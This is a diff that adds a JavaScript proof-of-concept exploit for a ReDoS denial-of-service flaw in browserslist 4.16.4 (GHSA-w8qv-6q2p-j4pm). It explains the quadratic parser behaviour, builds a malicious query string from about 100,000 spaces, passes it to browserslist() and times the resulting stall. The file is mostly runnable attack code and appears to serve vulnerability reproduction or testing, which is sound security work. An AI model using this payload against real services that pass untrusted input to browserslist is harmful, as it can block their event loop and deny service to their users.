@@ -1,0 +1,27 @@
+```javascript
+// Exploit for browserslist 4.16.4 (GHSA-w8qv-6q2p-j4pm)
+// ReDoS / algorithmic-complexity DoS in the query parser.
+//
+// browserslist's internal `find()`/`doMatch()` parser (index.js) tries every
+// possible suffix length of the input query string against several regexes
+// on each iteration, giving the parser O(n^2) worst-case behavior. A single
+// attacker-controlled query string of a few hundred KB can therefore block
+// the Node.js event loop for many seconds to minutes -- a classic Denial of
+// Service that many tools (webpack/babel/postcss configs, CLI flags, etc.)
+// feed untrusted strings into.
+
+const browserslist = require("./node_modules/browserslist");
+
+// A short prefix, a huge run of spaces (defeats the "and"/"or" fast paths
+// while forcing the O(n^2) suffix-scanning parser to churn), then a
+// trailing "and x" so it never short-circuits.
+const n = 100000;
+const malicious = "a" + " ".repeat(n) + "and x";
+
+console.log("Triggering browserslist() with a", malicious.length, "byte query...");
+const start = Date.now();
+
+browserslist(malicious);
+
+console.log("Finished in", Date.now() - start, "ms (should be seconds, demonstrating the DoS)");
+```
